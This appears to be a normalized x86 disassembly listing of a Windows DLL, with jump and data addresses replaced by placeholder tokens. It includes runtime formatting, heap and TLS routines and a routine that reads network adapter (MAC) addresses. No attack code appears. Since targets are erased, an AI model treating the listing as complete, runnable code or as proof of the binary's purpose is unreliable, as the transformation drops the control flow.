call sub_100255aa
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_1005f933
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_1007f310
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_10021130
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_1002839c
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_10030ff0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10005b50
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax [ ebp - 0x50 ]
call sub_100262c3
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1000eff4
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_1004b141
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_1006e175
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_1006a296
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10030370
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] eax
cmp eax ebx
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_10030370
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f580
add esp 0xc
sub_1004b1ed
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1004b280
push ebp
mov ebp esp
push ecx
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0x8
mov eax 0x1
mov esp ebp
pop ebp
retn 0x8
sub_1004b2e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008691b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_10060250
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10005aeb
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_1004b3c0
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
or eax [ rw-data ]
push ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x4 ]
mov ecx [ rw-data ]
mov esi [ ebp - 0x8 ]
cmp edi ecx
ja r-xdata
mov eax [ rw-data ]
jb r-xdata
push 0x0
push 0x2710
push ecx
push eax
call sub_100845a0
push 0x0
push 0x2710
push edi
push esi
mov ebx eax
call sub_100845a0
sub ebx eax
push ebx
call [ Sleep@IAT ]
cmp esi eax
jae r-xdata
sub_1004b429
mov edi edi
push ebp
mov ebp esp
call sub_1002d269
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1004b450
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1004b4b0
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ GetAdaptersInfo@IAT ]
push edi
mov edi ecx
lea ecx [ ebp - 0x4c ]
push ecx
push 0x0
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4c ] 0x0
call ebx
cmp eax 0x6f
je r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ edi ]
push esi
push edx
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x4c ]
push ecx
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edi [ ebp - 0xc ]
mov eax 0x9
mov ebx esi
call sub_100693d0
mov edi [ lstrcmpA@IAT ]
mov edi edi
mov edx [ edi ]
push esi
push 0x0
push edx
call [ HeapFree@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x48 ]
mov eax 0xa
call sub_10019570
movzx edx [ ebx + 0x199 ]
movzx eax [ ebx + 0x198 ]
movzx ecx [ ebx + 0x197 ]
push edx
movzx edx [ ebx + 0x196 ]
push eax
movzx eax [ ebx + 0x195 ]
push ecx
movzx ecx [ ebx + 0x194 ]
mov ebx [ ebp - 0x54 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x48 ]
push edx
mov ecx 0x12
call sub_1006d3c0
mov eax [ ebp - 0x50 ]
mov ecx [ eax ]
add esp 0x1c
push esi
push 0x0
push ecx
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebx + 0x1d8 ]
push ecx
call edi
test eax eax
je r-xdata
sub_1004b602
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_100579de
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_1005f1fb
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_1001b2d2
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_1005f1fb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001cffa
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001cffa
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_1001307c
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_1001b2d2
push [ esi + 0xbc ]
call sub_1001b2d2
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_1001b2d2
push [ ebp - 0x8 ]
call sub_1001b2d2
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1004b800
push ebp
mov ebp esp
push 0xffffffff
push sub_1008667f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x38 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002d4a0
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_1004b9a0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ esp + 0x34 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ esp + 0x2f ] 0x0
fxch st1
fxch st1
mov [ esp + 0x2f ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x2 ] cl
fstp [ esp ]
mov ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
mov [ eax + 0x3 ] 0x0
lea eax [ esp + 0x58 ]
push 0x6c
push eax
call sub_1000f103
mov ecx [ esp + 0x48 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ esp + 0x58 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ esp + 0x70 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ esp + 0x6c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1003fad0
mov ecx [ esp + 0x100 ]
add esp 0x44
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1004bbb0
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] 0x0
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] 0x0
sub_1004bc0f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_10039973
leave
retn 0x8
sub_1004bc30
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1005b670
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1004bd50
push ebp
mov ebp esp
push 0xffffffff
push sub_10089dbd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_1006ff30
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1003e780
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xbc ]
